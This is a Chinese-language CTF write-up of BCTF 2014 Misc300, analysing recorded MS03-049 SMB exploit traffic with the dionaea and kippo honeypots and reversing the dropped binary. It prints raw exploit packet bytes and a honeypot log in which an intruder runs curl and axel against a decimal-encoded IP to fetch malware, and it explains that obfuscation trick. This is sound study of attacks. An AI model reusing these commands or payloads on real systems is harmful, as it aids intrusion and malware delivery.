---
layout: post
title: "BCTF Misc300 Write up"
date: 2014-03-14 21:42:29 +0800
comments: true
categories: [bctf, ctf, writeup, packet] 
---

感冒在家養病逛fb, 突然看到有ctf可以打
馬上開skype問帳號開打XD


直接找一題沒人解的來玩 


{% img /images/writeup/bctf2014_misc300_problem.png %}
<!-- more -->

下載檔案可以看到疑似封包內容的 in out stream

``` python
stream = [('in', b'\x00\x00\x00T\xffSMBr\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x86\xe8\x00\x00\x18n\x001\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00'),
('out', b'\x00\x00\x00U\xffSMBr\x00\x00\x00\x00\x98\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x86\xe8\x00\x00\x18n\x11\x03\x00\x03\x01\x00\x01\x00\x00\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\xfd\xe3\x00\x80\xb3\x13"\xd7L#\xcf\x01\xc4\xff\x00\x10\x00\x0b\xffe8T~lB\xa4>\x12\xd2\x11\x97\x16D'),
('in', b'\x00\x00\x00\xb1\xffSMBs\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x86\xe8\x00\x00\x18n\x0c\xff\x00\x00\x00\xdf\xff\x02\x00\x01\x00\x00\x00\x00\x00S\x00\x00\x00\x00\x00\xd4\x00\x00\x80v\x00`Q\x06\x06+\x06\x01\x05\x05\x02\xa0G0E\xa0\x0e0\x0c\x06\x0a+\x06\x01\x04\x01\x827\x02\x02\x0a\xa23\x041NTLMSSP\x00\x01\x00\x00\x00\x05\x02\x88\xa2\x01\x00\x01\x00 \x00\x00\x00\x10\x00\x10\x00!\x00\x00\x00.AYplsysIiHy9uvbXWindows 2000 2195\x00Windows 2000 5.0\x00'),
('out', b'\x00\x00\x00\xad\xffSMBs\x16\x00\x00\xc0\x98\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x86\xe8\x00\x00\x18n\x04\xff\x00\x00\x00\x00\x00S\x00\x82\x00\xa1Q0O\xa0\x03\x0a\x01\x01\xa1\x0c\x06\x0a+\x06\x01\x04\x01\x827\x02\x02\x0a\xa2:\x048NTLMSSP\x00\x02\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x05\x02\x88\xa2\xa4\xdf\xe8\x0b\xf5\xc6\x1e:\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x05\x01(\x0a\x00\x00\x00\x0fWindows 5.1\x00Windows 2000 LAN Manager\x00WORKGROUP\x00'),
('in', b'\x00\x00\x01_\xffSMBs\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x86\xe8\x00\x00\x18n\x0c\xff\x00\x00\x00\xdf\xff\x02\x00\x01\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x5c\xd0\x00\x80$\x01\xa1\x81\xfe0\x81\xfb\xa2\x81\xf8\x04\x81\xf5NTLMSSP\x00\x03\x00\x00\x00\x18\x00\x18\x00@\x00\x00\x00z\x00z\x00X\x00\x00\x00\x02\x00\x02\x00\xd2\x00\x00\x00\x00\x00\x00\x00\xd4\x00\x00\x00 \x00 \x00\xd4\x00\x00\x00\x00\x00\x00\x00\xf4\x00\x00\x00\x05\x02\x88\xa2L\xc8\x1d\xb4s\xfa\xb4M\xc0\xa5F\xad\xb8\x16\x81\x89\xda\x87\x7f\x903\xd6hd\x0aS%4J\x08\xfa\x82E~\xc8R\xf3SW\xa3\x01\x01\x00\x00\x00\x00\x00\x00\x00m"y\xef\x27\xcf\x01\xda\x87\x7f\x903\xd6hd\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00\x07\x00\x08\x00\x00m"y\xef\x27\xcf\x01\x09\x00&\x00c\x00i\x00f\x00s\x00/\x002\x001\x001\x00.\x006\x005\x00.\x001\x009\x003\x00.\x002\x004\x008\x00\x00\x00\x00\x00\x00\x00\x00\x00.\x00A\x00Y\x00p\x00l\x00s\x00y\x00s\x00I\x00i\x00H\x00y\x009\x00u\x00v\x00b\x00X\x00\x00Windows 2000 2195\x00Windows 2000 5.0\x00'),

```

每行都有SMB很明顯了, 翻翻 SMB header 定義

http://msdn.microsoft.com/en-us/library/ee441774.aspx

Protocol (4 bytes): This field MUST contain the 4-byte literal string '\xFF', 'S', 'M', 'B', with the letters represented by their respective ASCII values in the order shown. In the earliest available SMB documentation, this field is defined as a one byte message type (0xFF) followed by a three byte server type identifier.


前面好像還包一層, 但不重要, 重要的是沒有前兩層的header  wireshark打不開

剩下兩條路走.

1. 自己parse smb protocol 或找現成的parser

2. 包前兩層讓wireshark看得懂


1.找不到現成的parser, 自己parse有點懶

後來看到wireshark 有個tool是 text2pcap可以幫忙補上L2, L3的header

但是在這邊卡了一段時間,因text2pcap一直沒有如預期的把內容塞進去


man裡面明明說

```
Here is a sample dump that
       text2pcap can recognize:

           000000 00 e0 1e a7 05 6f 00 10 ........
           000008 5a a0 b9 12 08 00 46 00 ........

```

結果他不認得,只會噴1 potential packet wrote 0 packet.

```console
Input from: demo
Output to: demo.pcap
Output format: PCAP
Generate dummy Ethernet header: Protocol: 0x800
Generate dummy IP header: Protocol: 6
Generate dummy TCP header: Source port: 139. Dest port: 139
Read 1 potential packet, wrote 0 packets (24 bytes).
```

最後發現他其實只能吃 #od -Ax -tx1 -v - 噴出來的格式
```
#od -Ax -tx1 -v - 
0000000    30  30  30  30  30  30  30  3a  20  35  63  37  38  20  33  34
0000010    33  33  20  35  63  37  38  20  33  32  33  31  20  35  63  37
0000020    38  20  33  30  33  31  20  35  63  37  38  20  33  30  33  30
0000030    20  20  5c  78  34  33  5c  78  32  31  5c  78  30  31  5c  78
```

確定能偽造header後 用以下command把parse過的檔案轉成pcap

```
od -Ax -tx1 -v input | text2pcap -T 139,139 - packet.pcap 
```

{% img /images/writeup/bctf2014_misc300_pcap.PNG %}

看到\BROWSER 又有叫 NetrAddAlternateComputerName 

google一下就會發現是 MS03-049


其實在這邊我只要去把那段shellcode解出來應該就差不多了

但找不到tool解 當時也沒想到直接在windows寫程式run他...已經不會在windows上寫程式了XD


回頭看提示發現跟honeypot有關

再看看檔名 **dionaea** ..What the fuck  

#dionaea 是一個honeypot project#


安裝太麻煩了,直接抓honeydrive下來,再參考這篇

http://blog.moep.name/index.php?/archives/2-Detecting-malware-with-dionaea.html

replay就可以重現當時的流量,dionaea還幫你分析好是MS03-049


```python
[08032014 18:18:33] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 1599
[08032014 18:18:34] SMB dionaea/smb/smb.py:405-info: got header
[08032014 18:18:34] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 2167
[08032014 18:18:35] SMB dionaea/smb/smb.py:405-info: got header
[08032014 18:18:35] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 3107
[08032014 18:18:36] SMB dionaea/smb/smb.py:405-info: got header
[08032014 18:18:36] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 3597
[08032014 18:18:37] SMB dionaea/smb/smb.py:405-info: got header
[08032014 18:18:37] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 3678
[08032014 18:18:38] SMB dionaea/smb/smb.py:405-info: got header
[08032014 18:18:38] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 4024
[08032014 18:18:38] rpcservices dionaea/smb/rpcservices.py:76-info: Calling WKSSVC NetAddAlternateComputerName (1b) maybe MS03-39 exploit?
[08032014 18:18:39] SMB dionaea/smb/smb.py:405-info: got header
[08032014 18:18:39] SMB dionaea/smb/smb.py:407-info: FragLen 2124 len(self.buf) 722

```


但大概是太久沒人解出來,主辦單位直接把難度降低 放出kippo.ttylog

honeydrive上也有kippo  

用他的playlog.py replay 可以看到以下結果
```console
nas3:/# cd tmp/
nas3:/tmp# ls
nas3:/tmp# touch 1.sh
nas3:/tmp# ls
1.sh 
nas3:/tmp# axel 2792326331/fool
bash: axel: command not found
nas3:/tmp# curl 2792326331/fool
bash: curl: command not found
nas3:/tmp# uname -r
Linux
nas3:/tmp# rm 1.sh
nas3:/tmp# exit
```

這裡有個有趣的地方, 2792326331/fool 

大家都知道網址前面是 hostname 或是 IP

但IP還可以用八進位或是16進位表示

詳見 : http://drops.wooyun.org/papers/146

所以 2792326331/fool  其實是個網址

抓下來是隻PE, 直接執行沒有看到寫registry或是寫檔的行為

Reverse過程沒什麼特別的 就沒有截圖了..

從IDA pro看有一段像是要寫registry, 

用ollydbg打開 把anti-debugging填成0x90 

就會發現該程式還會檢查參數還是什麼的,總之跳過之後

他就會把key寫進registry裡面




*可惜這次重感冒+隔天要上班, 臨時打也找不到人 只有學弟陪我玩QQ*









